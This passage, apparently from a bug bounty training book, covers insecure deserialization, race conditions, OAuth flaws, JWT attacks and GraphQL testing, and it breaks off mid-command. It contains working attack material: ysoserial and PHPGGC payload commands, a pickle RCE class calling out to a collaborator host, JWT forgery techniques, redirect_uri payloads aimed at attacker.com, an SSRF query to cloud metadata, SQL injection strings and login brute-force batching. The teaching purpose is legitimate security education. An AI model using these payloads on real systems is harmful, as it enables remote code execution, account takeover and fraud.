If the application has classes that perform dangerous operations in their `__wakeup`, `__destruct`, or `__toString` methods (called automatically during deserialization), an attacker can chain them together to execute arbitrary code — without ever calling a "dangerous" function directly. This is the gadget chain: existing, trusted, legitimate classes whose interactions produce RCE.

An analogy: imagine a Rube Goldberg machine where each ball bearing is a legitimate, innocuous part. But if you drop the first ball in the right place, the chain reaction ends with the safe opening. No single piece is dangerous — the chain is.

### Identifying Deserialization in the Wild

**Java:** Look for base64-encoded data starting with `rO0A` or raw bytes `AC ED 00 05`:

```bash
# In Burp, look for cookies or POST body values like:
rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1Z...

# Decode and check magic bytes
echo "rO0ABXNy..." | base64 -d | xxd | head -2
# 00000000: aced 0005 7372 ...   ← aced 0005 = Java serialized object
```

**PHP:** Look for `O:4:"User":2:{s:2:"id";i:42;s:4:"name";s:5:"Alice";}` patterns — the PHP serialized format.

**Python pickle:** Look for binary data in cookies, especially on Python/Django applications.

**Common locations to check:**

- Cookies (especially large, encoded ones)
- Hidden form fields with encoded data
- POST body parameters
- API request/response bodies
- `X-` headers storing session state
- WebSocket messages

### Java Deserialization with ysoserial

`ysoserial` generates payloads exploiting common gadget chains present in popular Java libraries:

```bash
# Download ysoserial
wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar

# List available gadget chains
java -jar ysoserial-all.jar 2>&1 | head -30
# CommonsCollections1, CommonsCollections2, Spring1, Groovy1, ...

# Generate a payload for CommonsCollections1 (Apache Commons)
java -jar ysoserial-all.jar CommonsCollections1 'nslookup YOUR-COLLABORATOR.net' | base64 -w 0

# The output is a base64-encoded serialized object
# Replace the legitimate serialized cookie/parameter with this value
```

**Detecting blind deserialization (no visible output):** Use a DNS-based payload — if the server deserializes your payload, it will make a DNS lookup to your Burp Collaborator domain:

```bash
java -jar ysoserial-all.jar CommonsCollections1 \
  'nslookup $(whoami).YOUR-COLLABORATOR.burpcollaborator.net' \
  | base64 -w 0
```

If Collaborator receives a DNS request like `www-data.YOUR-COLLABORATOR.burpcollaborator.net`, the application ran your command as `www-data`.

### PHP Deserialization with PHPGGC

```bash
# Install PHPGGC
git clone https://github.com/ambionics/phpggc.git
cd phpggc

# List available gadget chains
./phpggc -l

# Generate a payload for Laravel RCE
./phpggc Laravel/RCE5 system 'id' -b   # -b = base64 encode

# Generate for Symfony
./phpggc Symfony/RCE4 exec 'id' -b
```

### Python Pickle RCE

Python's `pickle` module executes arbitrary code during deserialization:

```python
import pickle, os, base64

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('nslookup YOUR-COLLABORATOR.net',))

payload = base64.b64encode(pickle.dumps(Exploit()))
print(payload)
```

Send this as a cookie or parameter to a Flask/Django application that deserializes pickle data.

## Practical / Lab Section

### Step 1: Identify Serialized Data in Burp

1. Browse the application while intercepting in Burp
2. In HTTP history, search for: `rO0A`, `serialize`, `__PHP_Incomplete_Class`, `.serialize`, `ACED0005`
3. Check cookie values: large, encoded cookies are suspicious
4. Decode base64 cookie values and look for magic bytes

```bash
# Quick check in terminal
echo "COOKIE_VALUE" | base64 -d | xxd | head -2
```

### Step 2: Test with ysoserial (Java)

```bash
# 1. Confirm the target is Java (look for .jsp, Apache, Spring in headers)

# 2. Generate a DNS-based detection payload
java -jar ysoserial-all.jar CommonsCollections1 \
  'nslookup YOURIDENT.burpcollaborator.net' | base64 -w 0 > payload.txt

# 3. Replace the serialized value in the request with payload.txt content
# 4. Send in Burp Repeater
# 5. Check Burp Collaborator for incoming DNS requests

# If DNS received → try different gadget chains if no RCE
java -jar ysoserial-all.jar CommonsCollections6 'id > /tmp/pwned' | base64 -w 0
```

### Step 3: Using Burp's Java Deserialization Scanner

1. Extender → BApp Store → "Java Deserialization Scanner"
2. Install and enable
3. Right-click a request containing serialized data → Extensions → Java Deserialization Scanner → Active scan
4. The extension automatically tries all ysoserial gadget chains with Collaborator payloads

### Step 4: Modify Java Serialized Objects with SerializationDumper

```bash
# Install SerializationDumper
wget https://github.com/NickstaDB/SerializationDumper/releases/latest/download/SerializationDumper.jar

# Dump readable representation of the serialized object
echo "rO0ABXNy..." | base64 -d > object.bin
java -jar SerializationDumper.jar -r object.bin

# This reveals the class names and field values
# Useful for understanding the object structure before crafting payloads
```

### Severity Assessment

|Scenario|Severity|
|---|---|
|Deserialization leads to RCE|Critical|
|Deserialization leads to arbitrary file read|High|
|Deserialization leads to authentication bypass|High|
|Deserialization leads to denial of service|Medium|

## Summary

Insecure deserialization occurs when an application deserializes data from an untrusted source using a format that can represent full objects (Java serialization, PHP serialize, Python pickle). Attackers craft malicious serialized objects using tools like ysoserial and PHPGGC that trigger gadget chains — sequences of legitimate classes that produce RCE when deserialized. Detection relies on identifying magic bytes (`rO0A` for Java, PHP's `O:` format), and confirmation uses DNS-based Collaborator payloads. This is a Critical-severity class when escalated to RCE.

## Checklist

- [ ] Searched all HTTP traffic for serialized data markers: `rO0A`, `ACED0005`, PHP `O:`, pickle magic bytes
- [ ] Identified the technology stack (Java, PHP, Python, Ruby) to choose the right tools
- [ ] Downloaded ysoserial (Java) or PHPGGC (PHP)
- [ ] Set up Burp Collaborator for DNS-based blind detection
- [ ] Generated a DNS-detection payload and sent it in place of the legitimate serialized value
- [ ] Checked Collaborator for DNS hits within 30 seconds of sending
- [ ] If DNS hit confirmed: tried all relevant gadget chains for RCE (`id`, `whoami`)
- [ ] Used Java Deserialization Scanner (Burp extension) as an automated check
- [ ] Used SerializationDumper to understand object structure if manual modification needed
- [ ] Documented exact gadget chain, payload, and evidence (Collaborator log screenshot)

> _"The best defense against attack is understanding how attacks work."_ — Gene Spafford

---

# Chapter 37: Race Conditions

## Objective

Understand what race conditions are, why they occur in web applications, how to identify vulnerable operations, and how to exploit them using Burp Suite's parallel request feature and custom tooling.

## Prerequisites

- Chapter 7: Burp Suite
- Chapter 3: HTTP
- Chapter 21: Business Logic Vulnerabilities (helpful context)

## Terminology

|Term|Definition|
|---|---|
|**Race Condition**|A flaw where the outcome of an operation depends on the timing or sequence of concurrent events|
|**Time-of-Check to Time-of-Use (TOCTOU)**|A specific race condition pattern where a check (is balance sufficient?) and a use (deduct balance) are not atomic|
|**Atomic Operation**|An operation that completes as a single, indivisible unit — cannot be interrupted mid-execution|
|**Concurrent Requests**|Multiple requests sent at exactly the same time|
|**Last-Write-Wins**|A common database behavior where the last write to a field overwrites earlier writes|
|**Single-Use Token**|A token (coupon, gift card, email verification) intended for one-time use|
|**HTTP/2 Single-Packet Attack**|A technique to send multiple requests in one TCP packet for precise timing|
|**Limit Override**|Using a race condition to exceed an intended limit (purchase cap, redemption count, rate limit)|

## Theory

### The Analogy: Two Bank Tellers, One Account

Imagine two bank tellers, Alice and Bob, serving customers simultaneously. A customer has $100. Two withdrawal requests for $100 each arrive at the same time:

```
Alice checks balance: $100 → sufficient ✓
Bob checks balance:   $100 → sufficient ✓  ← Both check BEFORE either deducts

Alice deducts $100. Balance: $0
Bob deducts $100.  Balance: -$100           ← Now overdrawn!
```

Each check was valid at the time it ran. But because they ran concurrently, both deductions succeeded. The account is now overdrawn.

Web applications have the same problem when they:

1. Read a value (check balance, check coupon usage, check rate limit)
2. Do something (deduct funds, mark coupon used, increment counter)

If another request slips in between steps 1 and 2, the check becomes stale.

### Common Race Condition Targets

|Feature|Race Condition Scenario|
|---|---|
|Coupon / promo code redemption|Redeem the same code multiple times|
|Gift card balance|Spend more than the balance|
|Purchase quantity limits|Buy more than the per-user limit|
|Referral bonus|Claim the same referral multiple times|
|Email verification|Reuse a single-use verification link|
|Password reset|Use a reset token multiple times|
|Vote / rating system|Vote more than once|
|Free trial activation|Activate the same free trial repeatedly|
|Transfer / withdrawal|Transfer the same funds twice simultaneously|

### The HTTP/2 Single-Packet Attack

Traditional race condition testing sends requests in parallel but HTTP/1.1 has network jitter — requests arrive at slightly different times. HTTP/2 multiplexes multiple requests over one TCP connection, and crucially: **multiple requests can be sent in a single TCP packet**, guaranteeing they arrive simultaneously.

```
HTTP/2 Single-Packet Attack:
TCP Packet 1:
├── Stream 1: POST /redeem (coupon=SAVE50)  ← these two frames
└── Stream 3: POST /redeem (coupon=SAVE50)  ← arrive at the exact same microsecond
```

This eliminates network jitter and dramatically increases the success rate of race condition attacks.

### The Race Window

The race window is the time between the check and the use. The larger the window, the easier the race condition is to exploit:

```
SMALL WINDOW (hard to exploit):
Check → Use   (microseconds, requires single-packet attack)

LARGE WINDOW (easy to exploit):
Check... [emails user, logs event, calls third-party API] ...Use
         ↑ plenty of time to slip in a concurrent request
```

## Practical / Lab Section

### Method 1: Burp Suite — Send Group in Parallel

Burp Suite's Repeater has a built-in "Send group in parallel" feature (added in Burp 2023):

1. Identify the vulnerable request (e.g., `POST /api/coupon/redeem`)
2. Send it to **Repeater**
3. Right-click the tab → **Add to group** (or use the `+` button)
4. Duplicate the tab 20 times (right-click → Duplicate)
5. Select the group header → **Send group in parallel**
6. Observe responses: if some return "Coupon already used" and others return "Discount applied", you raced successfully

### Method 2: Turbo Intruder for Precise Attacks

Turbo Intruder (Burp extension) gives fine-grained control:

```python
# Turbo Intruder script for race condition testing
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=20,
                           requestsPerConnection=1,
                           pipeline=False)
    # Queue 20 identical requests
    for i in range(20):
        engine.queue(target.req, str(i))

def handleResponse(req, interesting):
    # Flag responses that indicate success (e.g., 200 with "discount applied")
    if req.status == 200 and 'discount' in req.response:
        table.add(req)
```

1. Right-click request → Extensions → Send to Turbo Intruder
2. Paste the script above
3. Adjust the number of queued requests (20–50 is typical)
4. Click Attack

### Method 3: Command-Line with GNU Parallel

```bash
# Send 20 parallel requests
cat << 'EOF' > redeem.sh
curl -s -X POST https://target.com/api/coupon/redeem \
  -H "Cookie: session=YOUR_SESSION" \
  -H "Content-Type: application/json" \
  -d '{"coupon":"SAVE50"}'
EOF

# Execute 20 simultaneous requests
seq 20 | parallel -j 20 bash redeem.sh
```

### Method 4: Python asyncio

```python
import asyncio
import aiohttp

async def redeem(session, url, cookies, data):
    async with session.post(url, cookies=cookies, json=data) as resp:
        return await resp.text()

async def race():
    url = "https://target.com/api/coupon/redeem"
    cookies = {"session": "YOUR_SESSION"}
    data = {"coupon": "SAVE50"}

    async with aiohttp.ClientSession() as session:
        tasks = [redeem(session, url, cookies, data) for _ in range(20)]
        results = await asyncio.gather(*tasks)
        for i, result in enumerate(results):
            print(f"Request {i+1}: {result[:100]}")

asyncio.run(race())
```

### Assessing Impact

|Scenario|Severity|
|---|---|
|Double-spend on financial transaction|Critical|
|Redeem coupon/gift card multiple times|High|
|Bypass purchase quantity limit|Medium/High|
|Vote multiple times|Low/Medium|
|Bypass rate limiting on brute-force protection|High|

### Reporting Race Conditions

Race conditions can be tricky to reproduce reliably. In your report:

- State the success rate (e.g., "In 10 attempts, 7 succeeded")
- Note the number of concurrent requests required
- Explain whether it requires HTTP/2 or works with HTTP/1.1
- Document the exact observable evidence (two "success" responses, double balance deduction, etc.)

## Summary

Race conditions exploit the window between a security check and the action it protects. They are most valuable in financial features, coupon redemption, and limit enforcement. Modern exploitation relies on the HTTP/2 single-packet attack (available in Burp Repeater via "Send group in parallel") to eliminate network jitter. Turbo Intruder enables highly customized race attacks with scripting. Success is often probabilistic — testing requires multiple attempts and careful documentation of the success rate.

## Checklist

- [ ] Identified all features with limits or single-use properties (coupons, votes, free trials, withdrawals)
- [ ] Confirmed the endpoint uses HTTP/2 (check Burp's protocol column)
- [ ] Duplicated the target request 20 times in Burp Repeater
- [ ] Used "Send group in parallel" to execute simultaneous requests
- [ ] Observed responses: multiple "success" responses = race condition confirmed
- [ ] Measured success rate over 10+ attempts
- [ ] Tested with different thread counts (10, 20, 50) to find optimal concurrency
- [ ] Installed Turbo Intruder extension for complex race scenarios
- [ ] Documented the exact impact: what can be duplicated/bypassed?
- [ ] Did NOT execute this against financial transactions with real money

> _"A race condition is just a timing bug waiting to become a logic flaw."_ — Unknown

---

# Chapter 38: OAuth 2.0 Vulnerabilities

## Objective

Understand the OAuth 2.0 authorization framework, how the most common implementation errors create vulnerabilities, and how to test for them in bug bounty engagements.

## Prerequisites

- Chapter 3: HTTP
- Chapter 7: Burp Suite
- Chapter 18: Authentication Vulnerabilities

## Terminology

|Term|Definition|
|---|---|
|**OAuth 2.0**|An authorization framework that lets users grant third-party apps limited access to their accounts without sharing passwords|
|**Authorization Server**|The server that authenticates the user and issues tokens (e.g., Google, Facebook, GitHub)|
|**Resource Server**|The API that holds the user's data, accessed using OAuth tokens|
|**Client**|The application requesting access on behalf of the user|
|**Resource Owner**|The user who owns the data|
|**Authorization Code**|A short-lived code exchanged for an access token|
|**Access Token**|A credential used to access protected resources|
|**Refresh Token**|A long-lived token used to obtain new access tokens|
|**State Parameter**|A random value included in the OAuth request to prevent CSRF|
|**Redirect URI**|The URL the authorization server sends the user back to after authorization|
|**Scope**|The permissions being requested (read:email, write:files, etc.)|
|**PKCE**|Proof Key for Code Exchange — protection for public clients against authorization code interception|

## Theory

### The OAuth 2.0 Flow (Authorization Code Grant)

```
USER           CLIENT APP           AUTH SERVER        RESOURCE SERVER
│              │                    │                  │
│ 1. Click "Login with Google"      │                  │
│ ─────────────►│                   │                  │
│              │                    │                  │
│              │ 2. Redirect to Google with:           │
│              │    client_id, redirect_uri,           │
│              │    scope, state, response_type=code   │
│              │ ──────────────────►│                  │
│              │                    │                  │
│              │ 3. User authenticates at Google       │
│              │    User grants consent                │
│              │ ──────────────────────────────────────►
│              │                    │                  │
│              │ 4. Google redirects back:             │
│              │    redirect_uri?code=AUTH_CODE&state  │
│              │ ◄──────────────────│                  │
│              │                    │                  │
│              │ 5. App exchanges code for token:      │
│              │    POST /token (code, client_secret)  │
│              │ ──────────────────►│                  │
│              │                    │                  │
│              │ 6. Auth server returns access_token   │
│              │ ◄──────────────────│                  │
│              │                    │                  │
│              │ 7. App uses access_token to fetch data│
│              │ ──────────────────────────────────────►
```

### Common OAuth Vulnerabilities

**1. Missing or Weak State Parameter (OAuth CSRF)**

The `state` parameter prevents CSRF attacks against OAuth. If it is missing, predictable, or not validated: an attacker initiates their own OAuth flow, grabs the `code` from the authorization URL, and tricks a victim into visiting that URL. The victim's account gets linked to the attacker's OAuth identity — the attacker can then log in as the victim.

**Testing:**

```
Normal flow:
/oauth/authorize?client_id=app&redirect_uri=...&state=RANDOM_VALUE

Test 1: Remove state entirely
/oauth/authorize?client_id=app&redirect_uri=...
→ If no error, state is not validated

Test 2: Use a fixed state value, reuse it
→ If reuse doesn't cause an error, no CSRF protection
```

**2. Redirect URI Manipulation**

The authorization server should only redirect to pre-registered URIs. Misconfigurations allow redirect to attacker-controlled URLs — the `code` or `token` goes to the attacker.

```
Registered: https://app.example.com/callback

Attacks to try:
https://app.example.com/callback/../attacker_path
https://app.example.com/callback?extra=param
https://attacker.com               (if validation only checks prefix)
https://app.example.com.attacker.com  (suffix confusion)
https://app.example.com%2Fattacker.com  (URL encoding)
```

**3. Authorization Code Interception**

The authorization code appears in the browser URL and HTTP `Referer` headers. If the `redirect_uri` points to a page with external resources (analytics, CDN, advertising), the Referer header carries the code to third-party servers.

**4. Access Token in URL (Implicit Flow)**

The older Implicit flow puts the access token directly in the URL fragment. Browser history, logs, and Referer headers can leak it.

**5. Open Redirect Combined with OAuth**

If the application has an open redirect, it can be used to redirect the authorization code to an attacker's server even when exact redirect URI matching is enforced:

```
redirect_uri=https://app.example.com/redirect?next=https://attacker.com
```

The authorization server sends the code to `app.example.com/redirect`, which then redirects to `attacker.com` carrying the code in the URL or Referer.

**6. Account Linking/Takeover via OAuth**

If an application allows linking OAuth providers to existing accounts without verifying email ownership:

1. Register a normal account with `victim@gmail.com`
2. Create a Google account with `victim@gmail.com` (if you can)
3. Use "Login with Google" — the app links the Google OAuth identity to the existing account
4. You now own the victim's account

### Testing OAuth with Burp

**Step 1: Map the full flow**

Intercept every request during the OAuth login. The flow spans multiple redirects: initial redirect to auth server → user consent → redirect back with code → code-for-token exchange → token usage.

**Step 2: Test state parameter**

```
In Burp, intercept the initial redirect:
GET /oauth/authorize?client_id=app&redirect_uri=...&state=abc123&...

Modify: remove state= parameter entirely, forward
→ If login succeeds: state not validated → CSRF possible

Or: complete the flow, note the state value, try replaying with same state
```

**Step 3: Test redirect_uri manipulation**

```
In Burp, intercept and modify redirect_uri:
redirect_uri=https://app.example.com/callback

→ Try: redirect_uri=https://attacker.com
→ Try: redirect_uri=https://app.example.com.attacker.com
→ Try: redirect_uri=https://app.example.com/callback%2F..%2F..%2Fattacker
```

**Step 4: Check scope misconfigurations**

```
Normal scope: scope=read:profile
Try expanding:
  scope=read:profile read:email
  scope=admin
  scope=*
  scope=read:all write:all
```

If the authorization server grants expanded scopes without user consent → scope escalation.

## Summary

OAuth 2.0 is complex and frequently misconfigured. The most impactful bugs are missing or unvalidated state parameters (enabling CSRF/account takeover), redirect URI manipulation (code stolen to attacker-controlled server), and account linking flaws (taking over existing accounts). Testing OAuth requires mapping the entire multi-step flow in Burp and methodically testing each parameter. OAuth bugs can be Critical when they result in account takeover.

## Checklist

- [ ] Mapped the complete OAuth flow (all redirects captured in Burp)
- [ ] Identified the OAuth grant type (Authorization Code, Implicit, Client Credentials)
- [ ] Tested: is the `state` parameter present?
- [ ] Tested: is the `state` parameter validated (remove it, change it, reuse it)?
- [ ] Tested redirect_uri manipulation: attacker domain, suffix confusion, path traversal, URL encoding
- [ ] Checked whether authorization code can be reused after exchange
- [ ] Tested scope escalation: requested broader permissions than intended
- [ ] Checked for access tokens appearing in URLs or Referer headers
- [ ] Tested account linking: does linking match by email? Can email be spoofed?
- [ ] Checked for open redirects that could be chained with OAuth
- [ ] Verified PKCE is implemented if the client is a public client (mobile/SPA)

> _"OAuth is not an authentication protocol — it is an authorization framework. Confusion between the two is where bugs live."_ — The Bug Bounty Community

---

# Chapter 39: JWT Attacks

## Objective

Understand how JSON Web Tokens work, how attackers exploit common implementation flaws, and how to test for and demonstrate JWT vulnerabilities using Burp Suite and jwt_tool.

## Prerequisites

- Chapter 3: HTTP
- Chapter 7: Burp Suite
- Chapter 38: OAuth 2.0 (helpful context — JWTs are often used as OAuth tokens)

## Terminology

|Term|Definition|
|---|---|
|**JWT**|JSON Web Token — a compact, URL-safe token format for transmitting claims between parties|
|**Header**|The first part of a JWT — specifies the token type and signing algorithm|
|**Payload**|The second part — contains claims (user ID, role, expiration time)|
|**Signature**|The third part — cryptographic proof that the header and payload were not tampered with|
|**HS256**|HMAC-SHA256 — a symmetric signing algorithm (same secret signs and verifies)|
|**RS256**|RSA-SHA256 — an asymmetric algorithm (private key signs, public key verifies)|
|**alg:none**|A JWT with no signature — the server accepts it as valid if not properly checked|
|**Algorithm Confusion**|Tricking an RS256-configured server into verifying with a symmetric secret using HS256|
|**JWK**|JSON Web Key — a format for representing cryptographic keys|
|**kid**|Key ID — a header parameter that identifies which key was used for signing|
|**Claim**|A key-value pair in the JWT payload (e.g., `"role": "user"`)|

## Theory

### JWT Structure

A JWT looks like this:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWxpY2UiLCJyb2xlIjoidXNlciJ9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

Split on dots:
Header:    eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
Payload:   eyJ1c2VyIjoiYWxpY2UiLCJyb2xlIjoidXNlciJ9
Signature: SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

Decoded (base64url):

```json
// Header
{"alg": "HS256", "typ": "JWT"}

// Payload
{"user": "alice", "role": "user", "exp": 1735689600}

// Signature = HMACSHA256(base64url(header) + "." + base64url(payload), secret)
```

The signature protects the token. If you change `"role": "user"` to `"role": "admin"`, the signature no longer matches and the server should reject the token. _Should._

### Attack 1: alg:none

Some JWT libraries accept `alg: none` as a valid algorithm, meaning no signature is required at all. Simply change the algorithm to `none`, modify the payload, and remove the signature:

```
Original header:  {"alg": "HS256", "typ": "JWT"}
Modified header:  {"alg": "none",  "typ": "JWT"}

Original payload: {"user": "alice", "role": "user"}
Modified payload: {"user": "alice", "role": "admin"}

Signature: (empty — remove entirely)

Result: eyJhbGciOibm9uZSIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWxpY2UiLCJyb2xlIjoiYWRtaW4ifQ.
```

Variations to try:

```
"alg": "none"
"alg": "None"
"alg": "NONE"
"alg": "nOnE"
```

### Attack 2: Algorithm Confusion (RS256 → HS256)

This is more subtle. When a server uses RS256:

- The server signs tokens with its **private key**
- The server verifies tokens using its **public key**

The public key is... public. Attackers can obtain it.

If a vulnerable library sees a token with `alg: HS256`, it switches to symmetric verification. It uses the "public key" as the HMAC secret (since that's all it has). The attacker — who also has the public key — can sign a forged token with HS256 using that same public key as the secret. The server verifies it and accepts the forged token.

```
1. Obtain the server's public key (often at /jwks.json, /.well-known/jwks.json)
2. Forge a token with modified payload
3. Sign it using HS256 with the RSA public key as the HMAC secret
4. Send to server
```

```bash
# Using jwt_tool for algorithm confusion
python3 jwt_tool.py [ORIGINAL_JWT] -X k -pk public_key.pem
```

### Attack 3: JWT Header Injection — JWK Parameter

Some libraries allow the JWT header to include a `jwk` parameter (a public key embedded in the token itself) for key discovery. If the library trusts the embedded key without verifying it against a whitelist:

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "jwk": {
    "kty": "RSA",
    "n": "ATTACKER_PUBLIC_KEY_MODULUS",
    "e": "AQAB"
  }
}
```

The server trusts the embedded key, the attacker signs with the corresponding private key, and the server validates successfully. This is self-signed token forgery.

### Attack 4: kid (Key ID) Injection

The `kid` header parameter tells the server which key to use for verification. If the `kid` value is used in a database query or file system lookup without sanitization:

```json
// SQL Injection via kid
{"alg": "HS256", "kid": "' UNION SELECT 'attacker_secret' -- "}

// Path Traversal via kid
{"alg": "HS256", "kid": "../../dev/null"}
// If kid resolves to /dev/null, the "key" is an empty string
// Sign the token with an empty string → accepted by server
```

### Attack 5: Weak Secret Brute Force

If HS256 is used with a weak or guessable secret:

```bash
# Using hashcat
hashcat -a 0 -m 16500 jwt_token.txt wordlist.txt

# Using john
john --format=HMAC-SHA256 --wordlist=rockyou.txt jwt.txt

# Using jwt-cracker
jwt-cracker -t [JWT] -a "abcdefghijklmnopqrstuvwxyz" -l 5
```

If the secret is weak (e.g., `secret`, `password`, `changeme`, the app name), you can sign arbitrary tokens.

## Practical / Lab Section

### Step 1: Identify JWTs

Look for Bearer tokens in Authorization headers, cookies named `token` or `jwt`, and large base64url strings with two dots (`.`) separating them:

```bash
# In Burp, filter HTTP history by:
# Response contains: eyJ
# Or search for "Authorization: Bearer"

# Decode quickly in terminal
echo "eyJ1c2VyIjoiYWxpY2UifQ" | base64 -d
```

### Step 2: Install jwt_tool

```bash
git clone https://github.com/ticarpi/jwt_tool.git
cd jwt_tool
pip3 install -r requirements.txt

# Decode a JWT
python3 jwt_tool.py [JWT_HERE]

# Run all standard tests
python3 jwt_tool.py [JWT_HERE] -t -rh "Authorization: Bearer [JWT]" \
  -u https://target.com/api/me
```

### Step 3: Test alg:none

```bash
# jwt_tool automatically tries alg:none
python3 jwt_tool.py [JWT] -X a

# Or manually in Burp using the JWT Editor extension:
# 1. Install JWT Editor (BApp Store)
# 2. Open request with JWT → JWT Editor tab in request
# 3. Decode → modify payload (change role, user ID)
# 4. Header: change alg to "none"
# 5. Click "Sign" → select "Don't sign"
# 6. Send modified request
```

### Step 4: Test Algorithm Confusion

```bash
# 1. Get the public key
curl https://target.com/jwks.json

# 2. Save the public key as PEM
#    (convert JWK to PEM using jwt_tool or online converter)

# 3. Run algorithm confusion attack
python3 jwt_tool.py [JWT] -X k -pk public_key.pem \
  -I -pc role -pv admin
# -I = inject claim
# -pc = payload claim to modify
# -pv = new value
```

### Step 5: Using Burp's JWT Editor Extension

1. Install "JWT Editor" from BApp Store
2. Any request containing a JWT shows a new "JSON Web Tokens" tab
3. In that tab: decode the token, modify claims, re-sign with different algorithms
4. Built-in "Embedded JWK" attack, alg:none, and algorithm confusion attacks

## Summary

JWTs are widely used for authentication and are frequently misconfigured. The highest-impact attacks are `alg:none` (no signature required — trivial privilege escalation), algorithm confusion (RS256→HS256 using the public key as the secret), and embedded JWK injection (self-signed token forgery). jwt_tool automates most attacks. Burp's JWT Editor extension provides a GUI workflow. Successful JWT attacks typically result in privilege escalation or account takeover — High to Critical severity.

## Checklist

- [ ] Identified all JWT tokens in HTTP traffic (Authorization headers, cookies, response bodies)
- [ ] Decoded the JWT (jwt_tool or base64) — examined header algorithm and payload claims
- [ ] Tested `alg:none` (and case variations: None, NONE, nOnE)
- [ ] Checked for public key endpoints: `/jwks.json`, `/.well-known/jwks.json`, `/oauth/jwks`
- [ ] If RS256: attempted algorithm confusion attack using the public key
- [ ] Checked `kid` header parameter for SQL injection and path traversal
- [ ] Attempted to brute force the HS256 secret with hashcat or jwt-cracker
- [ ] Tested for the embedded JWK (`jwk` parameter) vulnerability
- [ ] Installed and used Burp's JWT Editor extension
- [ ] Ran jwt_tool `-t` for automated comprehensive tests
- [ ] Documented the successful payload modification and the privileges gained

> _"A token is only as strong as the trust model behind it."_ — Unknown

---

# Chapter 40: GraphQL Security Testing

## Objective

Learn how to discover, enumerate, and exploit vulnerabilities specific to GraphQL APIs, including introspection abuse, IDOR in queries and mutations, batching attacks, and injection via GraphQL arguments.

## Prerequisites

- Chapter 3: HTTP
- Chapter 7: Burp Suite
- Chapter 30: API Security Testing

## Terminology

|Term|Definition|
|---|---|
|**GraphQL**|A query language for APIs that lets clients specify exactly what data they need|
|**Schema**|The complete definition of a GraphQL API — all types, queries, mutations, and subscriptions|
|**Query**|A read operation in GraphQL|
|**Mutation**|A write/modify operation in GraphQL|
|**Subscription**|A real-time operation that pushes updates to clients|
|**Introspection**|A built-in GraphQL feature to query the schema itself|
|**Resolver**|The server-side function that handles a specific GraphQL field|
|**Field Suggestion**|GraphQL's error messages suggest similar valid field names when you mistype one|
|**Batching**|Sending multiple GraphQL operations in a single HTTP request|
|**InQL**|A Burp Suite extension for GraphQL security testing|
|**GraphQL Voyager**|A tool to visualize GraphQL schemas as interactive graphs|
|**Alias**|A GraphQL feature that allows renaming a field in the response, usable to duplicate operations|

## Theory

### GraphQL vs REST — The Security Difference

REST APIs have many endpoints (`/users`, `/posts`, `/comments`), each doing one thing. GraphQL has **one endpoint** (usually `/graphql`) that accepts queries specifying exactly what to retrieve or modify.

This single endpoint model has security implications:

1. **All operations go to one place** — harder to lock down with path-based WAF rules
2. **Introspection reveals the entire API surface** — including fields the UI never uses
3. **Batching can bypass rate limiting** — 100 login attempts in one HTTP request
4. **Deprecation doesn't remove fields** — old, insecure fields may persist
5. **Nested queries can cause DoS** — deeply nested queries consume exponential resources

### Introspection — The Schema Dump

Introspection lets you query the API about itself. In development, it is valuable. In production, it reveals your entire API design to attackers:

```graphql
{
  __schema {
    types {
      name
      kind
      fields {
        name
        args {
          name
          type { name kind }
        }
        type { name kind ofType { name kind } }
      }
    }
  }
}
```

This dumps every type, query, mutation, and argument in the entire API. Run this first.

### Introspection Disabled? Try These Bypasses

Applications often block introspection by checking for `__schema` in the query body. Bypasses:

```graphql
# Method 1: newline character
{__schema
{types{name}}}

# Method 2: Use __type instead of __schema
{__type(name: "User") { fields { name } }}

# Method 3: Fragment trick
fragment FullType on __Type { kind name }
{__schema{types{...FullType}}}
```

### Field Suggestion Mining

Even with introspection disabled, GraphQL's error messages reveal field names:

```graphql
# Mistype a field name and get suggestions
{ user { emal } }   ← typo

# Response:
# "Cannot query field 'emal' on type 'User'. Did you mean 'email'?"
# → 'email' field exists!

# Try:
{ user { admin } }  → "Did you mean 'adminRole'?"  → adminRole field exists!
{ user { passw } }  → "Did you mean 'password'?"   → password field (never should be exposed!)
```

Use **Clairvoyance** to automate field guessing using wordlists:

```bash
pip install clairvoyance
clairvoyance -u https://target.com/graphql -o schema.json -w wordlist.txt
```

### Authorization Testing in GraphQL

Every query and mutation is a potential IDOR. Test with two accounts:

```graphql
# With Account A's token — query Account B's data by ID
{
  user(id: "USER_B_ID") {
    email
    phone
    creditCards { number }
  }
}
# If data returns: IDOR in GraphQL
```

Test mutations that modify other users' data:

```graphql
mutation {
  updateUser(id: "USER_B_ID", email: "attacker@evil.com") { success }
}

mutation {
  deletePost(id: "OTHER_USERS_POST_ID") { success }
}
```

### Batching Attack — Rate Limit Bypass

GraphQL allows sending multiple operations in one request. This can bypass IP-based rate limiting on login or OTP:

```json
POST /graphql
[
  {"query": "mutation { login(email: \"user@test.com\", password: \"pass1\") { token } }"},
  {"query": "mutation { login(email: \"user@test.com\", password: \"pass2\") { token } }"},
  {"query": "mutation { login(email: \"user@test.com\", password: \"pass3\") { token } }"},
  ...100 more...
]
```

One HTTP request, 100+ login attempts, one IP, one rate limit counter.

Alias-based batching (when array batching is disabled):

```graphql
mutation {
  try1: login(email: "user@test.com", password: "pass1") { token }
  try2: login(email: "user@test.com", password: "pass2") { token }
  try3: login(email: "user@test.com", password: "pass3") { token }
}
```

### Injection in GraphQL Arguments

GraphQL arguments are still passed to resolvers — which may use them in SQL queries, LDAP queries, or system commands:

```graphql
# SQL Injection in GraphQL argument
{ user(id: "1 UNION SELECT username, password FROM admin--") { id name } }

# SSRF via URL argument
{ fetchMetadata(url: "http://169.254.169.254/latest/meta-data/") { content } }
```

## Practical / Lab Section

### Step 1: Install InQL for Burp

1. Burp Suite → Extender → BApp Store → "InQL" → Install
2. Browse the target application — InQL automatically detects GraphQL endpoints
3. Use InQL's scanner to run introspection and generate query templates

### Step 2: Manual Introspection

```bash
# Send introspection query via curl
curl -s -X POST https://target.com/graphql \
